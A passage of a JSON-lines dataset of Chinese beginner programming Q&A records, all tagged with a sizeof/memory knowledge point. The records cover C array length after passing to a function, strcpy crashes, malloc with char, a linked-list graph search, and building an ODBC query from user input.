class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;f &amp;#61; NULL;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;a &amp;#61; &lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;n&lt;/span&gt;[2]-&amp;gt;&lt;/span&gt;f &amp;#61; p;\n    p &amp;#61; (linek)malloc(sizeof(line));\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;f &amp;#61; NULL;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;a &amp;#61; &lt;span class=\"hljs-number\"&gt;6&lt;/span&gt;;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;n&lt;/span&gt;[3]-&amp;gt;&lt;/span&gt;f &amp;#61; p;\n    y &amp;#61; p;\n    p &amp;#61; (linek)malloc(sizeof(line));\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;f &amp;#61; NULL;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;a &amp;#61; &lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;y&lt;/span&gt;-&amp;gt;&lt;/span&gt;f &amp;#61; p;\n    p &amp;#61; (linek)malloc(sizeof(line));\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;f &amp;#61; NULL;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;a &amp;#61; &lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;n&lt;/span&gt;[4]-&amp;gt;&lt;/span&gt;f &amp;#61; p;\n    p &amp;#61; (linek)malloc(sizeof(line));\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;f &amp;#61; NULL;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;a &amp;#61; &lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;n&lt;/span&gt;[5]-&amp;gt;&lt;/span&gt;f &amp;#61; p;\n    p &amp;#61; (linek)malloc(sizeof(line));\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;f &amp;#61; NULL;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;a &amp;#61; &lt;span class=\"hljs-number\"&gt;6&lt;/span&gt;;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;n&lt;/span&gt;[6]-&amp;gt;&lt;/span&gt;f &amp;#61; p;\n    int v;\n    int e, r;\n    scanf(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, &amp;amp;e);\n    scanf(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, &amp;amp;r);\n    v &amp;#61; e;\n    int u[&lt;span class=\"hljs-number\"&gt;7&lt;/span&gt;] &amp;#61; { &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt; };\n    make(n, v, r, u);\n    return &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["输入后就没反应了 运行时间过长 为什么啊", ["#include<stdio.h>", "#include<stdlib.h>", "typedef struct line", "{", " int a;", " struct line *f;", "}line,*linek;", "void make(linek n[],int v,int r,int u[])", "{", "    linek p;", "    u[v]=1;", "    p=n[v]->f;", "    while(p!=NULL)", "    {", "        v=p->a;", "        if(u[v]!=1)", "        {", "            if(v==r)", "        {", "            printf(\"T\");", "            break;", "        }", "            make(n,v,r,u);", "        p=p->f;", "    }", "    }", "    }", "int main()", "{", "    linek n[7];", "    int i;", "    n[0]=(linek)malloc(sizeof(line));", "    n[0]->a=0;", "    n[0]->f=NULL;", "    for(i=1;i<7;i++)", "    {", "        n[i]=(linek)malloc(sizeof(line));", "        n[i]->a=i;", "        n[i]->f=NULL;", "    }", "    linek p,y;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=2;", "    n[1]->f=p;", "    y=p;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=4;", "    y->f=p;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=5;", "    n[2]->f=p;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=6;", "    n[3]->f=p;", "    y=p;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=5;", "    y->f=p;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=2;", "    n[4]->f=p;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=4;", "    n[5]->f=p;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=6;", "    n[6]->f=p;", "    int v;", "    int e,r;", "    scanf(\"%d\",&e);", "    scanf(\"%d\",&r);", "        v=e;", "    int u[7]={0,0,0,0,0,0,0};", "    make(n,v,r,u);", "    return 0;", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;data.Skip(2)&lt;br /&gt;再严密点就&lt;br /&gt;data.Skip(2).To Array()&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C#如何数组传参时传数组的指定一部分", ["#问题遇到的现象和发生背景 ", "\n", "#问题相关代码，请勿粘贴截图", "在C语言中,传入数组", "\n", "#", "include", " ", "<stdio.h>", "\n\n", "void", " ", "show", "(", "char", " *data, ", "int", " len)", "\n", "{\n    ", "for", "(", "int", " i = ", "0", "; i < len; i++)\n    {\n       ", "printf", "(", "\",%.2X\"", "+!i, data[i]);\n    }\n    ", "printf", "(", "\"\\n\"", ");\n}\n\n", "int", " ", "main", "(", "void", ")", "\n", "{\n   ", "char", " data[] = {", "1", ",", "2", ",", "3", ",", "4", ",", "5", ",", "6", ",", "7", ",", "8", ",", "9", ",", "10", "};\n   ", "show", "(data,", "sizeof", "(data));\n   ", "show", "(data+", "2", ", ", "sizeof", "(data) - ", "2", ");\n}\n", "\n", "运行结果及报错内容", "\n", "\n", "执行结果", "01 02 03 04 05 06 07 08 09 0A", "03 04 05 06 07 08 09 0A", "\n", "\n", "我的解答思路和尝试过的方法", "\n", "我现在使用就是重新创建一个数组,然后将原数组的数据指定部分复制到新的数组中, 然后传入新的数组,", "这样我怕回浪费过多的内存.", "\n", "我想要达到的结果", "\n", "然后在C# 我现在有 Byte[] data, 应该如何实现上面C语言中的功能呢."]], "Tag": "程序设计"}
{"Answer": "如果dict.txt是如下格式\r\nkey:content\r\n可以做如下修改，代码中对于一些问题做出了建议，不对之处可以讨论\r\n #include&lt;stdio.h&gt;\r\n#include&lt;stdlib.h&gt;\r\n#include&lt;string.h&gt;\r\ntypedef struct element\r\n{\r\n    char *key;\r\n    char *content;\r\n}element;\r\n\r\nchar buf[2048]={0};\r\nint get_elements(element **p, char * file_name)\r\n{\r\n    FILE * fp=fopen(file_name,\"r\");\r\n    if(fp==NULL)\r\n    {\r\n        printf(\"打开文件失败！\\n\");\r\n        return -1;\r\n    }\r\n    //*p=(element*)malloc(sizeof(element));\r\n    //char buf[2048]={0};\r\n\t//index为string.h库中函数名，在包含该库的时候建议不使用\r\n    int iIndex=0;\r\n    while(!feof(fp))\r\n    {\r\n\t\t//将内存分配放在这里，确保文件有内容可读的时候才分配内存\r\n        if((*p=(element*)realloc(*p,sizeof(element)*(iIndex+1))) == NULL)\r\n        {\r\n            puts(\"error\");\r\n            return -1;\r\n        }\r\n\r\n        memset(buf,0,sizeof(buf));\r\n        if(fgets(buf,sizeof(buf),fp)!=NULL) //读取文件一次,读取\r\n        {\r\n            (*p)[iIndex].key=(char *)calloc(strlen(buf),sizeof(char));\r\n            //strcpy((*p)[index].key,buf);//错误\r\n            //strncpy((*p)[index].key,buf,strlen(buf));//错误\r\n            //strcpy((*p)[index].key,&amp;buf[0]);//错误\r\n\t\t\tchar *sepIndex = index(buf, ':');\r\n\t\t\t//查找key\r\n            strncpy((*p)[iIndex].key, buf, sepIndex-buf);//strcpy很容易造成内存益处，建议使用strncpy\r\n\t\t\t//查找content\r\n            (*p)[iIndex].content=(char *)calloc(strlen(buf),sizeof(char));\r\n\t\t\tstrncpy((*p)[iIndex].content, sepIndex+1, strlen(sepIndex+1)); \r\n\t\t\tsepIndex = NULL;\r\n/*\r\n        if(fgets(buf,sizeof(buf),fp)!=NULL)\r\n        {\r\n            (*p)[index].content=(char *)calloc(strlen(buf),sizeof(char));\r\n            //strcpy((*p)[index].content,buf);\r\n            strcpy((*p)[index].content,&amp;buf[6]);\r\n            memset(buf,0,sizeof(buf));\r\n        }\r\n*/\r\n  \t\t    printf(\"%s: %s\",(*p)[iIndex].key,(*p)[iIndex].content);\r\n\t\t}\r\n\r\n        ++iIndex;\r\n/*\r\n\t\t//如果扩展内存放这里，意味着如果已经到了文件尾，还是继续分配了内存，造成资源浪费\r\n        if((*p=(element*)realloc(*p,sizeof(element)*(iIndex+1))) == NULL)\r\n        {\r\n            puts(\"error\");\r\n            return -1;\r\n        }\r\n        //memset(*p+index,0,sizeof(element));\r\n*/\r\n    }\r\n\t    fclose(fp);\r\n   \t\treturn iIndex;\r\n}\r\nint search_element(element *p,int n,const char * key)\r\n{\r\n    int i=0;\r\n    for(i=0;i&lt;n;i++)\r\n    {\r\n        //if(strcmp(p[i].key,key)==0)//p[i].key[3]是'\\n'字符，key[3]是'\\0'字符\r\n        if (strncmp(p[i].key, key, strlen(key)) == 0)\r\n        {\r\n           \tprintf(\"%s\",p[i].content);\r\n            return 1;\r\n        }\r\n    }\r\n    return -1;\r\n}\r\n//最好还是传指针的地址，不然就是野指针\r\n//这里你只释放了结构体内部的指针，对于结构体本身的指针并没有释放\r\n/*\r\nint free_elements(element *p,int n)\r\n{\r\n    int i=0;\r\n    for(i=0;i&lt;n;i++)\r\n    {\r\n        if (p[i].key)\r\n            free(p[i].key);\r\n        if (p[i].content)\r\n            free(p[i].content);\r\n    }\r\n    free(p);\r\n    return 0;\r\n}\r\n*/\r\nint free_elements(element **p,int n)\r\n{\r\n    int i=0;\r\n    for(i=0;i&lt;n;i++)\r\n    {\r\n        if ((*p)[i].key)\r\n            free((*p)[i].key);\r\n        if ((*p)[i].content)\r\n            free((*p)[i].content);\r\n    }\r\n    free(*p);\r\n\t*p = NULL;\r\n    return 0;\r\n}\r\nint main()\r\n{\r\n    char file_name[]=\"dict.txt\";\r\n    element *p=NULL;\r\n    int n = get_elements(&amp;p,file_name);//将词典的内容读到内存\r\n    search_element(p,n,\"you\");\r\n    free_elements(&amp;p,n);\r\n    return 0;\r\n}", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["strcpy复制数组，程序异常奔溃", ["问题：解释一下我备注错误的地方为什么会使程序崩溃。", "\n\n", "开发IDE:codeblock17.12", "\n链接：", "https://pan.baidu.com/s/1wwoP4v_Y5xYJtH7WZIWjdw", " 密码：gm87", "\n\n", " #include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\ntypedef struct element\n{\n    char *key;\n    char *content;\n}element;\nchar buf[2048]={0};\nint get_elements(element **p,char * file_name)\n{\n    FILE * fp=fopen(file_name,\"r\");\n    if(fp==NULL)\n    {\n        printf(\"打开文件失败！\");\n        return -1;\n    }\n    *p=(element*)malloc(sizeof(element));\n    //char buf[2048]={0};\n    int index=0;\n    while(!feof(fp))\n    {\n        if(fgets(buf,sizeof(buf),fp)!=NULL)\n        {\n            (*p)[index].key=(char *)calloc(strlen(buf),sizeof(char));\n            //strcpy((*p)[index].key,buf);//错误\n            //strncpy((*p)[index].key,buf,strlen(buf));//错误\n            //strcpy((*p)[index].key,&buf[0]);//错误\n            strcpy((*p)[index].key,&buf[1]);//正确\n            memset(buf,0,sizeof(buf));\n        }\n        if(fgets(buf,sizeof(buf),fp)!=NULL)\n        {\n            (*p)[index].content=(char *)calloc(strlen(buf),sizeof(char));\n            //strcpy((*p)[index].content,buf);\n            strcpy((*p)[index].content,&buf[6]);\n            memset(buf,0,sizeof(buf));\n        }\n        printf(\"%s%s\",(*p)[index].key,(*p)[index].content);\n\n        index++;\n        if((*p=(element*)realloc(*p,sizeof(element)*(index+1))) == NULL)\n        {\n            puts(\"error\");\n            return -1;\n        }\n        //memset(*p+index,0,sizeof(element));\n    }\n    fclose(fp);\n    return index;\n}\nint search_element(element *p,int n,const char * key)\n{\n    int i=0;\n    for(i=0;i<n;i++)\n    {\n        //if(strcmp(p[i].key,key)==0)//p[i].key[3]是'\\n'字符，key[3]是'\\0'字符\n        if (strncmp(p[i].key, key, strlen(key)) == 0)\n        {\n            printf(\"%s\",p[i].content);\n            return 1;\n        }\n    }\n    return -1;\n}\n//最好还是传指针的地址，不然就是野指针\nint free_elements(element *p,int n)\n{\n    int i=0;\n    for(i=0;i<n;i++)\n    {\n        if (p[i].key)\n            free(p[i].key);\n        if (p[i].content)\n            free(p[i].content);\n    }\n    free(p);\n    return 0;\n}\nint main()\n{\n    char file_name[]=\"dict.txt\";\n    element *p=NULL;\n    int n = get_elements(&p,file_name);//将词典的内容读到内存\n    search_element(p,n,\"you\");\n    free_elements(p,n);\n    return 0;\n}\n\n", "\n\n", "工程文件包：", "\n链接：", "https://pan.baidu.com/s/1FfHerOqcVlGoP3-vSvXMIA", " 密码：b1gu"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;主函数可以获知数组的长度,但是传入之后v变为单纯的指针,函数无法获取其长度&lt;br /&gt;在主函数中可以正确计算数组的长度&lt;br /&gt;但是传入函数后,该算是计算的是&lt;code class=\"language-javascript\"&gt;指针长度和int长度的倍数关系&lt;/code&gt;,因为64位下指针长度为8字节,int为4字节,所以输出为2&lt;br /&gt;&lt;code class=\"language-javascript\"&gt;有帮助望采纳~&lt;/code&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言！！为什么传参数过去会变！求解答！", ["问题遇到的现象和发生背景", "\n", "\n", "int", " ", "main", "(", ")", "{\n    ", "int", " V[]= {", "10", ",", "3", ",", "4", ",", "5", ",", "4", "};        \n    ", "int", " P[] = {", "24", ",", "2", ",", "9", ",", "10", ",", "9", "};     \n    ", "int", " len = ", "sizeof", "(V)/", "sizeof", "(V[", "0", "]);   \n    printf(", "\"%d\\n\"", ",len); \n    Knapsack01(V,P,", "13", ");           \n} \n", "int", " ", "Knapsack01", "(", "int", " V[], ", "int", " P[],", "int", " c", ")", "{\n    ", "int", " len2 = ", "sizeof", "(V)/", "sizeof", "(V[", "0", "]);   \n    printf(", "\"%d\\n\"", ",len2); \n   ", "for", "(", "int", " i=", "0", "; i<", "5", "; i++)\n        printf(", "\"%d\\n\"", ",V[i]); \n", "\n", "\n", "\n", "为什么V[]数组传参过去后，len会变少啊，但是printf出来的V数组仍然是原来的数组，求解答！"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;plane是什麽类型&amp;#xff1f;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["有大手帮我看看这里那边有问题吗", ["plane = （PLANE＊）malloc(sizeof(PLANE));这句那边有问题"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;PolyArray的定义是啥样的啊&amp;#xff1f;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["文件中读取数据存到两个数组当中，为什么报错", ["PolyNode* ha,", " * ", "hb,", " * ", "hc;\nha = (PolyNode*)malloc(sizeof(PolyNode));\nhb = (PolyNode*)malloc(sizeof(PolyNode));\nhc = (PolyNode*)malloc(sizeof(PolyNode));\nPolyArray* array_a,", " * ", "array_b;\narray_a = (PolyArray*)malloc(sizeof(PolyArray));\narray_b = (PolyArray*)malloc(sizeof(PolyArray));\n", "if", " (array_a&&array_b)\n{\n    ", "for", " (", "int", " i = ", "0", "; i < ", "3", "; i++)\n    {\n        fscanf", "_s(", "fp", ", ", "\"(%lf,%d)\"", ", &", "array_a", "[", "i", "].", "coef", ", &", "array_a", "[", "i", "].", "exp", ")", ";\n        fscanf", "_s(", "fp", ", ", "\"(%lf,%d)\"", ", &", "array_b", "[", "i", "].", "coef", ", &", "array_b", "[", "i", "].", "exp", ")", ";\n    }\n}\n", "CreatePoly(", "ha", ", 3, ", "array_a", ")", ";\n", "CreatePoly(", "hb", ", 2, ", "array_b", ")", ";\n", "AddPoly(", "ha", ", ", "hb", ", ", "hc", ")", ";\nPolyNode* s = (PolyNode*)malloc(sizeof(PolyNode));\n", "if", " (hc)\n{\n    s = hc->next;\n}\n", "while", " (s)\n{\n    fprintf(fp, ", "\"\\n(%lf,%d)\"", ", s->data.coef, s->data.exp);\n    s = s->next;\n}\nfree(ha);\nfree(hb);\nfree(hc);\nfree(array_a);\nfree(array_b);\nfclose(fp);\n", "\n", "系统给出的问题是：", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;条件是自己定义的&amp;#xff0c;例如&amp;#xff1a;SELECT * FROM Teacher WHERE id &amp;#61; 0;&lt;/p&gt;\n\n&lt;p&gt;这个id等于什么就是用户输入的&amp;#xff0c;这里只是需要将字符串组合一下就行。&lt;/p&gt;\n\n&lt;p&gt; &lt;/p&gt;\n\n&lt;p&gt;举一个相似例子&amp;#xff0c;自己根据自己的需求进行改代码就行&amp;#xff1a;&lt;/p&gt;\n\n&lt;pre&gt;\n&lt;code class=\"language-cpp\"&gt;int id &amp;#61; 0;\nchar sql[256];\n\ncout &amp;lt;&amp;lt; &amp;#34;请输入条件id&amp;#xff1a;&amp;#34;;\ncin &amp;gt;&amp;gt; id;\n\n// C语言字符串组合\nsnprintf(sql, 256, &amp;#34;SELECT * FROM Teacher WHERE id &amp;#61; %d;&amp;#34;, id);&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;组合出来的sql就是你需要执行的SQL语句了。&lt;/p&gt;\n\n&lt;p&gt; &lt;/p&gt;\n\n&lt;p&gt;点个采纳吧&amp;#xff01;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++用odbc连接数据库", ["怎么让用户输入查询条件，这是我的查询过程", "\n\n", "\n", "SQLHSTMT  hStmt= NULL;\n    ret = SQLAllocHandle(SQL_HANDLE_STMT, hDbc, &hStmt);\n\n    //SQL查询语句 \n    SQLTCHAR sql[] = _T(\"SELECT  * FROM  Teacher \");\n\n    //执行SQL语句\n    ret = SQLExecDirect(hStmt, sql, SQL_NTS); //SQL_NTS自动计算sql语句的长度\n    if ((ret == SQL_SUCCESS) || (ret == SQL_SUCCESS_WITH_INFO))\n    {\n        //查询之后，所有数据放到了一块缓冲区，我们需要把他分离出来\n        TCHAR id[6] = { 0 };\n        TCHAR name[32] = { 0 };\n        TCHAR sex[6] = {0};\n        int age =  0 ;\n        TCHAR xibu[10] = { 0 };\n        //绑定字段\n        SQLLEN len = SQL_NTS;\n        SQLBindCol(hStmt, 1, SQL_C_WCHAR, id, sizeof(id), &len);\n        SQLBindCol(hStmt, 2, /*SQL_C_CHAR*/SQL_C_WCHAR, name, sizeof(name), &len);\n        SQLBindCol(hStmt, 3, SQL_C_WCHAR, sex, sizeof(sex),&len );\n        SQLBindCol(hStmt, 4, SQL_C_LONG, &age, sizeof(age), 0);\n        SQLBindCol(hStmt, 5, SQL_C_WCHAR, xibu, sizeof(xibu), &len);\n        //逐行遍历，获取数据\n        ret = SQLFetch(hStmt);\n        while (ret != SQL_NO_DATA)\n        {\n            wcout << id << \"\\t\" << name << \"\\t\" <<sex<<\"\\t\" <<age <<\"\\t\"<<xibu<< endl;\n\n            //每次清除一下上行的旧数据,保证下次获取的数据干净\n            ZeroMemory(id, sizeof(id));\n            ZeroMemory(name, sizeof(name));\n            ZeroMemory(sex, sizeof(sex));\n            age = 0;\n            ZeroMemory(xibu, sizeof(xibu));\n            //获取下一行缓冲区的数据填充到id,name,age\n            ret = SQLFetch(hStmt);\n        }\n\n\n        SQLLEN n = 0;\n        ret = SQLRowCount(hStmt, &n);//查询被影响的行数（适用于SELECT ,INSERT,UPDATE,DELETE操作）\n        if (ret == SQL_SUCCESS || ret == SQL_SUCCESS_WITH_INFO)\n        {\n            _tprintf(_T(\"查询%d行数据成功!\\n\"), n);\n        }\n\n    }\n    else if (ret == SQL_ERROR)\n    {\n        SQLTCHAR   state[128] = { 0 };\n        SQLTCHAR   msg[128] = { 0 };\n        //获取错误信息，注意填写语句句柄\n        ret = SQLError(hEnv, hDbc, hStmt, state, NULL, msg, sizeof(msg), NULL);\n        wcout << state << \"   \" << msg << endl;\n    }\n\n\n    //释放语句句柄\n    if (hStmt)\n    {\n        ret = SQLFreeHandle(SQL_HANDLE_STMT, hStmt);\n    }\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;scanf(&amp;#34;%c&amp;#34;&amp;#xff0c;这句前加一个getchar()&lt;br /&gt;你输入一个字符后按回车键了&amp;#xff0c;这样会有一个换行符&amp;#xff0c;需要用getchar()接收掉&amp;#xff0c;否则scanf(&amp;#34;%c&amp;#34;会接收这个换行符&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言molloc()函数在char类型中怎么使用", ["在动态内存分配中使用molloc()函数，int整型可以显示出来，但把数据换成char类型就运行出错了，这是怎么回事啊？", "\n", "\n", "#include <stdio.h>", "#include <stdlib.h>", "int main()", "{", "\n", "char", " *int_array ;\n", "int", " no_els , i ;\n\n", "printf", "(", "\"Enter the number of elements: \"", ");\n", "scanf", "(", "\"%d\"", ", &no_els );\n\nint_array = (", "char", " *)", "malloc", "( no_els * ", "sizeof", "( ", "char", " )) ;\n", "if", "( int_array == ", "NULL", " )\n    ", "printf", "(", "\"Cannot allocate memory\\n\"", ");\n", "else", "\n{\n    ", "for", "( i = ", "0", " ; i < no_els ; i++ )\n    {\n        ", "printf", "(", "\"Enter element %d: \"", ", i+", "1", " );\n        ", "scanf", "(", "\"%c\"", ",int_array+i);\n    }\n\n    ", "for", "( i = ", "0", " ; i < no_els ; i++ )\n        ", "printf", "(", "\"Enter %d is %c\\n\"", ",i+", "1", ",*(int_array+i));\n    ", "free", " ( int_array );    \n}    \n    ", "return", " ", "0", " ;\n", "\n", "}", "\n", "运行结果是这样的", "\n", "\n", "用gets函数和puts函数试过 结果报错的更离谱了", "\n", "我想要达到的结果是用char类型逐行显示每个元素", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; _CRT_SECURE_NO_WARNINGS 1&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&lt;span class=\"hljs-string\"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; a[&lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;], b[&lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;], c[&lt;span class=\"hljs-number\"&gt;20&lt;/span&gt;];\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; j; \n    &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%s%s&amp;#34;&lt;/span&gt;, &amp;amp;a,&amp;amp;b);\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; sz1 &amp;#61; &lt;span class=\"hljs-built_in\"&gt;strlen&lt;/span&gt;(a) ;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; sz2 &amp;#61; &lt;span class=\"hljs-built_in\"&gt;strlen&lt;/span&gt;(b) ;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (j &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; j &amp;lt; sz1; j&amp;#43;&amp;#43;) \n    {\n        c[j] &amp;#61; a[j];\n    }\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (j &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; j &amp;lt; sz2; j&amp;#43;&amp;#43;) \n    {\n        c[sz1 &amp;#43; j] &amp;#61; b[j];\n    }\n\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, c);\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;用这个函数&amp;#xff0c;那个函数可能把\\0也包含在长度里面了&lt;br /&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/825536555766126.jpg\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/759388855766156.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/531019855766164.jpg\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["将两个原数组的值按顺序赋给一个新的数组", ["#", "define", " _CRT_SECURE_NO_WARNINGS 1", "\n", "#", "include", " ", "<stdio.h>", "\n", "int", " main()\n{\n    ", "char", " a[", "10", "], b[", "10", "], c[", "20", "];\n    ", "int", " j; \n    scanf(", "\"%s%s\"", ", &a,&b);\n    ", "int", " sz1 = ", "sizeof", "(a) / ", "sizeof", "(a[", "0", "]);\n    ", "int", " sz2 = ", "sizeof", "(b) / ", "sizeof", "(b[", "0", "]);\n    ", "for", " (j = ", "0", "; j < sz1; j++) \n    {\n        c[j] = a[j];\n    }\n    ", "for", " (j = ", "0", "; j < sz2; j++) \n    {\n        c[sz1 + j] = b[j];\n    }\n    printf(", "\"%s\"", ", c);\n    ", "return", " ", "0", ";\n}\n", "\n", "为什么上面不能将两个原数组的值按先后顺序赋给新数组呢？就比如a[2]=12,b[3]=abc,c[5]=12abc"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;这个存储方式比大小是比较ascii&amp;#xff0c;不是比较sizeof&amp;#xff0c;他们的sizeof都是1。&lt;br /&gt;题目是让你比较输入的3个字符的大小&amp;#xff0c;按从小到大输出。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["三个字符根据在计算机内的存储方式排列", ["咋写，sizeof以后咋输出啊？咋把整型变量再转化为字符然后输出啊"]], "Tag": "程序设计"}
